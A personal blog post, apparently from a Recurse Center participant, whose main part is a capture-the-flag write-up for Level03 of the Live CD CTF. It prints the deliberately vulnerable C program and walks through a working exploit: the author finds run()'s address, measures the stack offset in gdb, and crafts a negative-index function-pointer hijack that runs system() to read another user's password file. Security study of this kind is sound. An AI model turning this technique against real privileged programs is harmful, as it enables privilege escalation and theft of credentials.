---
title: "Live CD CTF Revisited - Level03"
date: 2018-02-23T18:18:50Z
---
I was at RC until 5 AM last night!

It should come as no surprise, then, that I got into RC ridiculously late - it's probably a bad sign that I'm not even really keeping track of exactly how late I am anymore.

### General Thoughts
My overarching general thought is how stupid it is to write these several days late. I think from this point forward I should just write posts at the end of the night even if its like 6 AM and I'm exhausted - otherwise, all potential thoughts are polluted by later considerations and it doesn't feel good at all. 

As I struggle to remember, I think this day ended up being generally pretty positive, despite coming in late. As much as I've been late 95% of my days at RC, I do think it has an effect on my productivity and general mindset going forward, and its starting to make me more lackadaisical as a person and more willing to waste time when I get in.

I spent a lot of time re-treading old ground with the [Live CD CTF](http://www.janosgyerik.com/hacking-contest-on-a-live-cd/), and while that sounds like I should find that negative, I actually found it deeply rewarding.

### What I did
Coffee chats continue to be a rousing success!

I had a great conversation with NL about his history in film and creating programmatic interactive media before coming to RC. He's currently working on [convolution filters](https://en.wikipedia.org/wiki/Kernel_(image_processing)), specifically [median filters](https://en.wikipedia.org/wiki/Median_filter) for [image denoising](https://en.wikipedia.org/wiki/Noise_reduction).

That led neatly into an introduction to [algorithmic complexity](https://www.cs.cmu.edu/~adamchik/15-121/lectures/Algorithmic%20Complexity/complexity.html) and how he might be able to apply it to his project - I didn't learn too much on my end but it was great helping someone through some of the pitfalls I found myself in when I first began analyzing algorithms.

I also managed to put together a passable waiting room [React](https://reactjs.org/) component. I still haven't committed it yet though, it feels kind of gross and wrong.

I also got pulled back into the [Live CD CTF](http://www.janosgyerik.com/hacking-contest-on-a-live-cd/) and I realized that I didn't have a good mental model of some of the actual solutions for each Level.

On that note, I've decided to make a better effort in writing up my solutions so I can refer to them later! 

I encourage you to give it a try yourself before reading up on the solution, though!

It would be rational to start at Level00, but because this is my blog and I can do what I want I'm going to start with Level03 instead.

Basically, Level03 provides three files - a Makefile, a C file, and a corresponding binary executable with the Level03 user's permissions on it.

A quick reminder - the point of this specific set of CTFs is to [cat](http://www.linfo.org/cat.html) the .password file in the home directory of the user one level above you.

The C file provided is as follows:

```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>

#define NUM_FNS 4

typedef int (*fn_ptr)(const char *);

int to_upper(const char *str)
{
printf("Uppercased string: ");
int i = 0;
for (i; str[i]; i++)
putchar(toupper(str[i]));
printf("\n");
return 0;
}

int to_lower(const char *str)
{
printf("Lowercased string: ");
int i = 0;
for (i; str[i]; i++)
putchar(tolower(str[i]));
printf("\n");
return 0;
}

int capitalize(const char *str)
{
printf("Capitalized string: ");
putchar(toupper(str[0]));
int i = 1;
for (i; str[i]; i++)
putchar(tolower(str[i]));
printf("\n", str);
return 0;
}

int length(const char *str)
{
int len = 0;
for (len; str[len]; len++) {}

printf("Length of string '%s': %d\n", str, len);
return 0;
}

int run(const char *str)
{
// This function is now deprecated.
return system(str);
}

int truncate_and_call(fn_ptr *fns, int index, char *user_string)
{
char buf[64];
// Truncate supplied string
strncpy(buf, user_string, sizeof(buf) - 1);
buf[sizeof(buf) - 1] = '\0';
return fns[index](buf);
}

int main(int argc, char **argv)
{
int index;
fn_ptr fns[NUM_FNS] = {&to_upper, &to_lower, &capitalize, &length};

// circumvent busybox ash dropping privileges
uid_t uid = geteuid();
setreuid(uid, uid);

if (argc != 3) {
printf("Usage: ./level03 INDEX STRING\n");
printf("Possible indices:\n[0] to_upper\t[1] to_lower\n");
printf("[2] capitalize\t[3] length\n");
exit(-1);
}

// Parse supplied index
index = atoi(argv[1]);

if (index >= NUM_FNS) {
printf("Invalid index.\n");
printf("Possible indices:\n[0] to_upper\t[1] to_lower\n");
printf("[2] capitalize\t[3] length\n");
exit(-1);
}

return truncate_and_call(fns, index, argv[2]);
}
```

For the most part, this code doesn't matter, except for two key insights: 

1. The user-given index doesn't do any validation on numbers less than zero
2. There is a deprecated function, run(), that allows execution of arbitrary system commands through the use of [system](http://man7.org/linux/man-pages/man3/system.3.html)

Using the [nm](https://sourceware.org/binutils/docs/binutils/nm.html) command on the binary gives us the address for the run() function, which we're going to need to point our user-supplied index to in order to get the binary to run our commands. For me, the address of the run() function is 0804879b.

My initial thought was to use the negative index to directly access run() somewhere on the call stack, but this doesn't work because truncate_and_call expects a *function pointer* as opposed to a function itself. We're going to need to pass it the address we find. Also keep in mind that addresses are [little-endian](http://searchnetworking.techtarget.com/definition/big-endian-and-little-endian) in the provided [Live CD](https://en.wikipedia.org/wiki/Live_CD), so do remember to represent the address that way in our user-input.

The second thing we need to do is find the offset between the fns array and our user string. Specifically, we're going to want the offset between the fns array and the buffer that our user string gets copied into. 

We can find this offset using the juicy [GNU debugger](https://en.wikipedia.org/wiki/GNU_Debugger), or gdb, to step through the binary and examine the stack.


The relevant commands we'll need to achieve this are:
* break [name_of_function], which sets a breakpoint when we enter a function body
* p &[name_of_variable], which prints the address of the pointer to that variable
* run [...args], which runs the code with its required arguments
* c, which runs code from breakpoint to breakpoint

And that's it!

Basically, to find the required negative offset to point to the buffer, we're going to set a breakpoint in main() and truncate_and_call(). This allows us to find the addresses of fns and buf, respectively.

Once we have the addresses of fns and buf, we notice two things:

1. The addresses change every time we run code - uhoh
2. The addresses have a constant difference of 108 - huzzah!

Because each address is four bytes long, we won't be using 108 directly - instead we'll be using 108/4, or 27 as our negative offset.

That leaves us with a command that looks something like this:

```
$ ./level03 -27 "0804879b"
```

But, this isn't going to work.

Recall that, first off, all the addresses are in [hexadecimal](https://en.wikipedia.org/wiki/Hexadecimal), so we're going to need to somehow pipe hexadecimal as our input.

We'll do this using [bash command substitution](http://teaching.idallen.com/cst8207/16f/notes/710_command_substitution.html).

Specifically, we'll be using [echo](https://en.wikipedia.org/wiki/Echo_(command)) with some specific options:

```
$(echo -en '\x9b\x87\x04\x08')
```

In this case, -e allows us to enable interpretation of the backslashed hexadecimal characters, and -n keeps us from outputting the trailing newline [as per the man page](https://ss64.com/bash/echo.html).

Altogether, the command looks like this:

```
./level03 -27 "$(echo -en '\x9b\x87\x04\x08')"

```

Which would work, except that we haven't written in any commands. Make sure you add characters in groups of 4 (and decrease your offset accordingly), and you end up with something like this:

```
./level03 -19 "$(echo -en 'cat /home/level03/.password     \x9b\x87\x04\x08')"
```

Which totally works.

The next level is pretty obviously a [buffer overflow attack](https://en.wikipedia.org/wiki/Buffer_overflow), but I'll save it for next week.

I also learned some pretty next-level [Vim](https://en.wikipedia.org/wiki/Vim_(text_editor)) commands, notably r to replace characters and the "in" modifier, i. Basically, I can now replace single characters without having to do a tedious delete and re-type, and I can apply commands to things "inside" brackets (for example, if I wanted to delete everything between two round parens, I might type 'di(').

GAME CHANGER

Finally, there was another round of presentations today for the mini-batchlings to present what they'd been working on for the past week:

* JX presented a brief look into [Wireshark](https://www.wireshark.org/) and [netcat](https://en.wikipedia.org/wiki/Netcat)
* KM talked about his work trying to get [Kythe](https://github.com/google/kythe) working for [Rust](https://www.rust-lang.org/en-US/)
* AS presented the work he did with [type inference](https://en.wikipedia.org/wiki/Type_inference) in [Ruby](https://www.ruby-lang.org/en/)
* EAB presented the work she did trying to find lost commits in [Git](https://git-scm.com/)
* LD threw together a [WAT](https://www.destroyallsoftware.com/talks/wat) web quiz for some popular languages
* FD showed off her progress on a top-down [bullet hell](https://en.wikipedia.org/wiki/Shoot_%27em_up) written in [Haskell](https://www.haskell.org/)
* CM showed off some generative art stuff she's been working on in [React](https://reactjs.org/)

### What I learned
* How to actually use [gdb](https://www.gnu.org/software/gdb/)!
* Intro to stack memory and function addressing
* More sweet [Vim](https://en.wikipedia.org/wiki/Vim_(text_editor)) commands!

### Interests/Stuff to work on
* Splendor in React!
* Code up Knapsack problem!
* CTF!
* [fast.ai](http://www.fast.ai/)
* Something in Prolog??
* PICO-8?
* Something with compilers? Maybe just the lexing and parsing side?
* Kubernetes!
* MongoDB!
